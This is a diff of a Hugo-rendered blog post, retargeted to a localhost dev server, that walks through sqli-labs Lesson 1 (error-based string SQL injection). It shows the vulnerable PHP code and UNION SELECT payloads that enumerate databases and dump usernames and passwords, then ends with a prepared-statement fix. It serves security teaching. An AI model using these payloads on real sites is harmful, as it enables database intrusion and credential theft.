@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     
 
 
@@ -70,17 +70,17 @@
 <meta name="twitter:description" content="A walkthrough of SQL Injection Lab Lesson 1: Error-Based String Injection. Explanation, vulnerable code, exploitation steps, payloads, and secure coding practices." />
 
 
-<base href="https://r00tpunk.github.io/posts/learning/sqli/less1/" />
-<link rel="canonical" href="https://r00tpunk.github.io/posts/learning/sqli/less1/" itemprop="url" />
-<meta name="url" content="https://r00tpunk.github.io/posts/learning/sqli/less1/" />
-<meta name="twitter:url" content="https://r00tpunk.github.io/posts/learning/sqli/less1/" />
-<meta property="og:url" content="https://r00tpunk.github.io/posts/learning/sqli/less1/" />
+<base href="http://localhost:1313/posts/learning/sqli/less1/" />
+<link rel="canonical" href="http://localhost:1313/posts/learning/sqli/less1/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/learning/sqli/less1/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/learning/sqli/less1/" />
+<meta property="og:url" content="http://localhost:1313/posts/learning/sqli/less1/" />
 
 
 <meta property="og:updated_time" content="2025-09-08T16:00:00&#43;05:00" />
 
 
-<link rel="sitemap" type="application/xml" title="Sitemap" href='https://r00tpunk.github.io/sitemap.xml' />
+<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -99,13 +99,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.149.0">
+<meta name="generator" content="Hugo 0.148.2">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.1c6f56a6497e1d68469eb2a7efcf2b145601a94408f411014a7af5ffc3a73522.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.c5418c20c87786ca86a048c94829afd7a4878d46a40852faf7a3bb64f3dced4e.css">
 
 
     
@@ -172,7 +172,7 @@
     <h1 class="brand">
         
         
-            <a href="https://r00tpunk.github.io/">
+            <a href="http://localhost:1313/">
                 <h1>r00tpunk</h1>
             </a>
         
@@ -223,6 +223,12 @@
                 
                         
                 
+                        
+                
+                        
+                
+                        
+                
             
         
         
@@ -243,11 +249,11 @@
                         </li>
                         
                             <li class="bullet">
-                                <a href="https://r00tpunk.github.io/posts/learning/">Learning</a>
+                                <a href="http://localhost:1313/posts/learning/">Learning</a>
                             </li>
                         
                             <li class="bullet">
-                                <a href="https://r00tpunk.github.io/posts/ctf/">CTF Archive</a>
+                                <a href="http://localhost:1313/posts/ctf/">CTF Archive</a>
                             </li>
                         
                     
@@ -258,6 +264,12 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -298,6 +310,17 @@
                         
                 
                         
+                
+                        
+                
+                        
+                
+                        
+                            <li class="heading">
+                                <a href="/posts/learning/">Learning</a>
+                            </li>
+                            
+                    
                 
                         
                 
@@ -356,7 +379,7 @@
                 <div class="post">
   <div class="info">
   <h1 class="post-title">
-    <a href="https://r00tpunk.github.io/posts/learning/sqli/less1/">SQL Injection Lab – Lesson 1 (Error-Based: String)</a>
+    <a href="http://localhost:1313/posts/learning/sqli/less1/">SQL Injection Lab – Lesson 1 (Error-Based: String)</a>
   </h1>
 
   <div class="headline">
@@ -381,19 +404,19 @@
     <ul class="tags">
       
       <li class="tag-SQL Injection">
-        <a href="https://r00tpunk.github.io/tags/sql-injection">SQL Injection</a>
+        <a href="http://localhost:1313/tags/sql-injection">SQL Injection</a>
       </li>
       
       <li class="tag-Web Security">
-        <a href="https://r00tpunk.github.io/tags/web-security">Web Security</a>
+        <a href="http://localhost:1313/tags/web-security">Web Security</a>
       </li>
       
       <li class="tag-Error-Based Injection">
-        <a href="https://r00tpunk.github.io/tags/error-based-injection">Error-Based Injection</a>
+        <a href="http://localhost:1313/tags/error-based-injection">Error-Based Injection</a>
       </li>
       
       <li class="tag-Labs">
-        <a href="https://r00tpunk.github.io/tags/labs">Labs</a>
+        <a href="http://localhost:1313/tags/labs">Labs</a>
       </li>
       
     </ul>
@@ -406,11 +429,11 @@
   
 </div>
 
-  <h1 id="what-is-this-lesson-about">What is this Lesson About?</h1>
+  <h2 id="what-is-this-lesson-about">What is this Lesson About?</h2>
 <p>This lab demonstrates a classic <strong>Error-Based SQL Injection vulnerability</strong>.</p>
 <p>The application takes user input from the URL (<code>id</code> parameter) and uses it directly in a SQL query without proper validation or sanitization.</p>
 <p>The purpose of this lesson is to understand how SQL errors can reveal valuable information and how attackers exploit them.</p>
-<h1 id="how-to-identify-if-it-is-error-based">How to Identify if It Is Error-Based?</h1>
+<h2 id="how-to-identify-if-it-is-error-based">How to Identify if It Is Error-Based?</h2>
 <p>When testing a parameter for SQL injection, attackers often add characters like:</p>
 <pre tabindex="0"><code>?id=1
 ?id=1&#39;
@@ -424,7 +447,7 @@
 <p>This indicates an <strong>Error-Based SQL Injection</strong>.</p>
 <p>In this lab, when an invalid character such as <code>'</code> (single quote) is added, the application responds with an SQL error.</p>
 <p>This confirms that the application is vulnerable to <strong>Error-Based SQL Injection (String)</strong>.</p>
-<h1 id="vulnerable-source-code">Vulnerable Source Code</h1>
+<h2 id="vulnerable-source-code">Vulnerable Source Code</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/Audi-1/sqli-labs/blob/master/Less-1/index.php
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// including the MySQLi connection file
@@ -458,7 +481,7 @@
 <li>The variable <code>$id</code> is directly placed into the query.</li>
 <li>No validation, escaping, or parameterization is done.</li>
 </ul>
-<h2 id="how-the-injection-happens">How the Injection Happens</h2>
+<h3 id="how-the-injection-happens">How the Injection Happens</h3>
 <p>The injection happens because the application directly takes the <code>id</code> parameter from the URL.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost/sqli-labs/Less-1/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>The input is inserted into the query without sanitization</p>
@@ -466,12 +489,12 @@
 </span></span></code></pre></div><p>If an attacker inputs <code>' OR '1'='1</code> the query becomes</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Since <code>'1'='1'</code> is always true, the attacker can bypass conditions and retrieve unintended results.</p>
-<h2 id="payloads-for-exploitation">Payloads for Exploitation</h2>
+<h3 id="payloads-for-exploitation">Payloads for Exploitation</h3>
 <p>Once the injection point is confirmed, attackers can use payloads to extract sensitive data from the database.</p>
 <p>Checking Injection</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">--+
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">2</span> <span style="color:#75715e">--+
-</span></span></span></code></pre></div><h1 id="dumping-data-from-db">Dumping data from DB</h1>
+</span></span></span></code></pre></div><h2 id="dumping-data-from-db">Dumping data from DB</h2>
 <p>Finding Column Count (using ORDER BY)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 1 --+
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=1&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">--+
@@ -483,28 +506,27 @@
 <p>Fatal error: Uncaught mysqli_sql_exception: Unknown column &lsquo;19&rsquo; in &lsquo;order clause&rsquo;</p></blockquote>
 <p>Now we&rsquo;ve 3 columns, so our payloads will look like this</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,3 --+
-</span></span></span></code></pre></div><p>\\ http://localhost:8080/sqli-labs/sqli-labs-master/Less-1/?id=-1&rsquo; union select 1,2,3 &ndash;+</p>
-<p><img src="/columnreflect.jpg" alt="Alt text"></p>
+</span></span></span></code></pre></div><p><img src="/sqli-01/columnreflect.jpg" alt="Alt text"></p>
 <p>As you can see here our column is beign reflected</p>
 <p>Getting Database Name</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,database(),3 --+
-</span></span></span></code></pre></div><p><img src="/databasereflect.jpg" alt="Alt text">
+</span></span></span></code></pre></div><p><img src="/sqli-01/databasereflect.jpg" alt="Alt text">
 Getting Current User</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, user(),3 --+
-</span></span></span></code></pre></div><p><img src="/cuser.jpg" alt="Alt text">
+</span></span></span></code></pre></div><p><img src="/sqli-01/cuser.jpg" alt="Alt text">
 Listing Databases</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+
-</span></span></span></code></pre></div><p><img src="/listofdb.jpg" alt="Alt text">
+</span></span></span></code></pre></div><p><img src="/sqli-01/listofdb.jpg" alt="Alt text">
 Dumping Tables of Current Database</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --+
-</span></span></span></code></pre></div><p><img src="/tofcdb.jpg" alt="Alt text">
+</span></span></span></code></pre></div><p><img src="/sqli-01/tofcdb.jpg" alt="Alt text">
 Dumping Columns of a Table</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;</span>users<span style="color:#e6db74">&#39; --+
-</span></span></span></code></pre></div><p><img src="/dcofct.jpg" alt="Alt text">
+</span></span></span></code></pre></div><p><img src="/sqli-01/dcofct.jpg" alt="Alt text">
 Extracting Data from Users Table</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password)FROM users --+
-</span></span></span></code></pre></div><p><img src="/edfut.jpg" alt="Alt text"></p>
-<h1 id="how-to-fix-sql-injection">How to Fix SQL Injection</h1>
+</span></span></span></code></pre></div><p><img src="/sqli-01/edfut.jpg" alt="Alt text"></p>
+<h2 id="how-to-fix-sql-injection">How to Fix SQL Injection</h2>
 <p>To prevent SQL Injection, follow secure coding practices:</p>
 <p>Use Prepared Statements (Parameterized Queries):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
@@ -536,18 +558,10 @@ Extracting Data from Users Table</p>
 <h2 id="final-summary">Final Summary</h2>
 <p>This lesson demonstrates an Error-Based String SQL Injection.</p>
 <ul>
-<li>
-<p>Attackers identify it by injecting special characters and observing database error messages.</p>
-</li>
-<li>
-<p>The vulnerability occurs due to unsanitized input directly used in SQL queries.</p>
-</li>
-<li>
-<p>Payloads can extract database name, user, tables, columns, and data.</p>
-</li>
-<li>
-<p>The solution is to use prepared statements, input validation, and avoid displaying detailed error messages.</p>
-</li>
+<li>Attackers identify it by injecting special characters and observing database error messages.</li>
+<li>The vulnerability occurs due to unsanitized input directly used in SQL queries.</li>
+<li>Payloads can extract database name, user, tables, columns, and data.</li>
+<li>The solution is to use prepared statements, input validation, and avoid displaying detailed error messages.</li>
 </ul>
 
   
@@ -555,6 +569,8 @@ Extracting Data from Users Table</p>
 <div class="footer">
     
 	    
+            <a class="previous-post" href="http://localhost:1313/posts/learning/sqli/intro/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>01. SQL Injection</a>
+        
 	    
     
 </div>
@@ -569,11 +585,16 @@ Extracting Data from Users Table</p>
       <h4 id="contents"></h4>
       <nav id="TableOfContents">
   <ul>
-    <li><a href="#how-the-injection-happens">How the Injection Happens</a></li>
-    <li><a href="#payloads-for-exploitation">Payloads for Exploitation</a></li>
-  </ul>
-
-  <ul>
+    <li><a href="#what-is-this-lesson-about">What is this Lesson About?</a></li>
+    <li><a href="#how-to-identify-if-it-is-error-based">How to Identify if It Is Error-Based?</a></li>
+    <li><a href="#vulnerable-source-code">Vulnerable Source Code</a>
+      <ul>
+        <li><a href="#how-the-injection-happens">How the Injection Happens</a></li>
+        <li><a href="#payloads-for-exploitation">Payloads for Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#dumping-data-from-db">Dumping data from DB</a></li>
+    <li><a href="#how-to-fix-sql-injection">How to Fix SQL Injection</a></li>
     <li><a href="#final-summary">Final Summary</a></li>
   </ul>
 </nav>
